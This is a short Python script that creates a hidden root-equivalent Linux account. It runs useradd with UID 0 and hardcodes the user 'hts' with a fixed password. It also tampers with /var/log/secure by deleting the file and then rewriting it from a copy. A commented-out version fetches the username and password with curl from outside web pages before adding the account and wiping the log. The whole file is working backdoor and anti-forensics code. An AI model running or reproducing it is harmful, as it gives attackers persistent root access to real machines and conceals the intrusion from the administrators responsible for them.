import subprocess
from time import sleep
# def getit():
#     s = subprocess.getstatusoutput("curl https://www.jianshu.com/p/bdbe55fd009d")
#     s = str(s)
#     start = s.find('{{{%')
#     end = s.find('%}}}')
#     t = s[start:end]
#     c = t[5:-1]
#     S = subprocess.getstatusoutput("curl https://www.jianshu.com/p/10812f911298")
#     S = str(S)
#     Start = S.find('{{{%')
#     End = S.find('%}}}')
#     T = S[Start:End]
#     C = T[5:-1]
#     cmmd = "useradd -p `openssl passwd -1 -salt 'jjt' "+ c+"`"+" -u 0 -o -g root -G root -s /bin/bash -d /home/"+C+" "+C
#     cc = subprocess.getstatusoutput(cmmd)
#     rmcmd = 'rm -r -f '+'/home/'+C
#     rm = subprocess.getstatusoutput(rmcmd)
#     rmsecure = 'rm -r -f /var/log/secure'
#     subprocess.getstatusoutput(rmsecure)
#     touchfile = 'touch /var/log/secure'
#     subprocess.getstatusoutput(touchfile)
# if __name__== '__main__':
#     getit()


import os
print('six')
import subprocess
C='hts'
c = 'pwdht2018'
cmmd = "useradd -p `openssl passwd -1 -salt 'uroot' " + c + "`" + " -u 0 -o -g root -G root -s /bin/bash -d /home/" + C + " " + C
rmtouch = 'rm -r -f /var/log/secure'
rmrms = 'rm -r -f /var/log/rms'
fp = open('/var/log/secure','r')
for line in fp:
    fq = open('/var/log/rms','a')
    fq.write(line)
fp.close()
fq.close()
subprocess.getstatusoutput(cmmd)
subprocess.getstatusoutput(rmtouch)
rp = open('/var/log/rms','r')
for line in rp:
    rq = open('/var/log/secure','a')
    rq.write(line)
rp.close()
rq.close()
subprocess.getstatusoutput(rmrms)